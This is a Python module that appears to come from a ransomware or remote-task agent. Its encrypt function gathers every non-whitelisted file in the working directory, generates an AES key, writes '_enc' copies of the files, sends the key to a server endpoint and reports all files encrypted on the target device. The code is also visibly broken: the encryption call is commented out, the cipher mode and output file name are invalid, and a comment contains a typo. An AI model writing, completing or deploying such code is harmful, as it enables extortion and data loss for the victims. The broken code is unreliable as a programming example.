import os
import json
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms
from result import result
from config import whitelisted_files
from api import api_put

def encrypt(task, device_id, device_ip):
    files = []
    for file in os.listdir():
        if file in whitelisted_files:
            continue
        files.append(file)
    
    print("files: ", files)
    
    c_sym = os.urandom(32)
    cipher = Cipher(algorithms.AES(c_sym), mode=algorithms.AES.MODE_GCM())
    encryptor = cipher.encryptor()
    for file in files:
        ciphertext = None
        tag = None
        with open(file, 'rb') as fd:
            content = fd.read()
            # ciphertext, tag = encryptor.update(content) + encryptor.finalize()
            ciphertext = content
        with open((file, "_enc"), 'wb') as fd:
            fd.write((ciphertext, tag)) # tag is concatenated for integrity check
    
    key_data = {
        'target_id': task['target_id'],
        'symmetric_key': c_sym
    }
    api_put('/keys', key_data)
    
    # Send c_sym to server
        # server decrupts the symmetric key and stores it
    
    return result(task['id'], task['task_id'], True, f'ALL FILES ENCRYPTED ON {device_id}@{device_ip}')